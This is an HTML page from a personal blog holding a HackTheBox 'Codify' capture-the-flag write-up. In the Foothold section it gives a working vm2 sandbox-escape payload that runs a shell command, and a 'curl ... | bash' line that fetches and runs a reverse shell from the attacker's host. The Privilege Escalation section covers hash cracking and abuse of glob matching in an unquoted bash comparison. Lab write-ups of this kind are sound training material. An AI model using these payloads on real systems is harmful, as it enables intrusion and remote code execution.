@@ -1,0 +1,301 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Codify Codify is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting &gt; nmap -sC -sV -oN codify.nmap 10.10.11.239 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2 …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Codify"/>
+  <meta property="og:description" content="Codify Codify is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting &gt; nmap -sC -sV -oN codify.nmap 10.10.11.239 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2 …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/codify.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-01-13 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Codify</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/codify">CTF: HackTheBox Codify</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#codify" title="Codify">Codify</a><ul><li><a class="toc-href" href="#enumeration-fingerprinting" title="Enumeration &amp; Fingerprinting">Enumeration &amp; Fingerprinting</a></li><li><a class="toc-href" href="#foothold" title="Foothold">Foothold</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="codify">Codify</h2>
+<p>Codify is an "Easy" unix box.</p>
+<h3 id="enumeration-fingerprinting">Enumeration &amp; Fingerprinting</h3>
+<blockquote>
+<p>&gt; nmap -sC -sV -oN codify.nmap 10.10.11.239<br/>
+...<br/>
+PORT     STATE SERVICE VERSION<br/>
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)<br/>
+...<br/>
+80/tcp   open  http    Apache httpd 2.4.52<br/>
+|_http-server-header: Apache/2.4.52 (Ubuntu)<br/>
+|_http-title: Codify<br/>
+3000/tcp open  http    Node.js Express framework<br/>
+|_http-title: Codify<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  </p>
+</blockquote>
+<p>Ports open are 22 and 80 ; the "codify.htb" domain is added to /etc/hosts.</p>
+<p>Some JS sandbox application is presented at codify.htb:</p>
+<p><img alt="codify-home.png" src="http://localhost:1337/images/ctf/htb/machines/codify/codify-home.png"/></p>
+<p>In the about us, an important information is disclosed: the application is running the "vm2" library for the sandboxing:</p>
+<p><img alt="codify-about.png" src="http://localhost:1337/images/ctf/htb/machines/codify/codify-about.png"/></p>
+<h3 id="foothold">Foothold</h3>
+<p>This <a href="https://github.com/patriksimek/vm2/security">library</a> has multiple know <a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-g644-9gfx-q4q4">sandbox escape vulnerabilities</a>.</p>
+<p>A PoC is available <a href="https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd">there</a>; trying the following malevolous code to check if the service is exploitable:</p>
+<div class="highlight"><pre><span></span><code><span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="n">VM</span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="ss">"vm2"</span><span class="p">);</span>
+<span class="n">const</span><span class="w"> </span><span class="n">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">VM</span><span class="p">();</span>
+
+<span class="n">const</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">`</span>
+<span class="n">const</span><span class="w"> </span><span class="n">customInspectSymbol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Symbol</span><span class="p">.</span><span class="k">for</span><span class="p">(</span><span class="s1">'nodejs.util.inspect.custom'</span><span class="p">);</span>
+
+<span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="o">[</span><span class="n">customInspectSymbol</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="k">depth</span><span class="p">,</span><span class="w"> </span><span class="n">opt</span><span class="p">,</span><span class="w"> </span><span class="n">inspect</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="n">inspect</span><span class="p">.</span><span class="k">constructor</span><span class="p">(</span><span class="s1">'return process'</span><span class="p">)().</span><span class="n">mainModule</span><span class="p">.</span><span class="n">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="n">execSync</span><span class="p">(</span><span class="s1">'curl http://10.10.14.103:8000'</span><span class="p">);</span>
+<span class="w">    </span><span class="err">}</span><span class="p">,</span>
+<span class="w">    </span><span class="nl">valueOf</span><span class="p">:</span><span class="w"> </span><span class="n">undefined</span><span class="p">,</span>
+<span class="w">    </span><span class="k">constructor</span><span class="err">:</span><span class="w"> </span><span class="n">undefined</span><span class="p">,</span>
+<span class="err">}</span>
+
+<span class="n">WebAssembly</span><span class="p">.</span><span class="n">compileStreaming</span><span class="p">(</span><span class="n">obj</span><span class="p">).</span><span class="k">catch</span><span class="p">(()</span><span class="o">=&gt;</span><span class="err">{}</span><span class="p">);</span>
+<span class="err">`</span><span class="p">;</span>
+
+<span class="n">vm</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">code</span><span class="p">);</span>
+</code></pre></div>
+<p>A callback is received from the server so the application is vulnreable:</p>
+<p><img alt="rce-callback.png" src="http://localhost:1337/images/ctf/htb/machines/codify/rce-callback.png"/></p>
+<p>A reverse shell is obtained by the following payload:</p>
+<blockquote>
+<p>curl http://10.10.14.103:8000/shell | bash</p>
+</blockquote>
+<p>where "shell" is a file containing a bash reverse shell command.</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>After some basic enumeration, a SQLite database containing a password hash is found:</p>
+<p><img alt="joshua-password-hash.png" src="http://localhost:1337/images/ctf/htb/machines/codify/joshua-password-hash.png"/></p>
+<p>Cracking the hash as follows:</p>
+<blockquote>
+<p>&gt; hashcat -m 3200 hashes &nbsp;/usr/share/dict/rockyou.txt
+... <br/>
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1</p>
+</blockquote>
+<p>After logging as joshua with the recovered password, it appears that the user can run a bash script with sudo privileges:</p>
+<p><img alt="joshua-sudo.png" src="http://localhost:1337/images/ctf/htb/machines/codify/joshua-sudo.png"/></p>
+<p>The script is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="nv">DB_USER</span><span class="o">=</span><span class="s2">"root"</span>
+<span class="nv">DB_PASS</span><span class="o">=</span><span class="k">$(</span>/usr/bin/cat<span class="w"> </span>/root/.creds<span class="k">)</span>
+<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/var/backups/mysql"</span>
+
+<span class="nb">read</span><span class="w"> </span>-s<span class="w"> </span>-p<span class="w"> </span><span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span><span class="w"> </span>USER_PASS
+/usr/bin/echo
+
+<span class="k">if</span><span class="w"> </span><span class="nv">$DB_PASS</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nv">$USER_PASS</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span>/usr/bin/echo<span class="w"> </span><span class="s2">"Password confirmed!"</span>
+<span class="k">else</span>
+<span class="w">        </span>/usr/bin/echo<span class="w"> </span><span class="s2">"Password confirmation failed!"</span>
+<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="k">fi</span>
+
+/usr/bin/mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+
+<span class="nv">databases</span><span class="o">=</span><span class="k">$(</span>/usr/bin/mysql<span class="w"> </span>-u<span class="w"> </span><span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span><span class="w"> </span>-h<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>-p<span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"SHOW DATABASES;"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/grep<span class="w"> </span>-Ev<span class="w"> </span><span class="s2">"(Database|information_schema|performance_schema)"</span><span class="k">)</span>
+
+<span class="k">for</span><span class="w"> </span>db<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nv">$databases</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>/usr/bin/echo<span class="w"> </span><span class="s2">"Backing up database: </span><span class="nv">$db</span><span class="s2">"</span>
+<span class="w">    </span>/usr/bin/mysqldump<span class="w"> </span>--force<span class="w"> </span>-u<span class="w"> </span><span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span><span class="w"> </span>-h<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>-p<span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/gzip<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz"</span>
+<span class="k">done</span>
+
+/usr/bin/echo<span class="w"> </span><span class="s2">"All databases backed up successfully!"</span>
+/usr/bin/echo<span class="w"> </span><span class="s2">"Changing the permissions"</span>
+/usr/bin/chown<span class="w"> </span>root:sys-adm<span class="w"> </span><span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+/usr/bin/chmod<span class="w"> </span><span class="m">774</span><span class="w"> </span>-R<span class="w"> </span><span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+<span class="w">    </span>/usr/bin/echo<span class="w"> </span><span class="s1">'Done!'</span>
+</code></pre></div>
+<p>Running <em>shellcheck</em> against the script:</p>
+<blockquote>
+<p>&gt; shellcheck mysql-backup.sh<br/>
+Line 6:  <br/>
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS  <br/>
+^-- <a href="https://www.shellcheck.net/wiki/SC2162">SC2162</a> (info): read without -r will mangle backslashes.  <br/>
+Line 9:<br/>
+if $DB_PASS == $USER_PASS; then<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^-- <a href="https://www.shellcheck.net/wiki/SC2053">SC2053</a> (warning): Quote the right-hand side of == in  to prevent <strong>glob matching</strong>.</p>
+</blockquote>
+<p>The script fails to proper check the password since the $USER_PASS variable is not quoted, allowing glob matching; proving a star (*) as user password, will result into satisfying the condition and passing the check.</p>
+<p>Since the script is unsafely passing mysql user password inline to mysqldump, observing the processing with pspy is possible to obtain it: </p>
+<p><img alt="privilege-escalation.png" src="http://localhost:1337/images/ctf/htb/machines/codify/privilege-escalation.png"/></p>
+<p>Root password is:</p>
+<blockquote>
+<p>kljh12k3jhaskjh12kjh3</p>
+</blockquote>
+<p><img alt="codify-root.png" src="http://localhost:1337/images/ctf/htb/machines/codify/codify-root.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
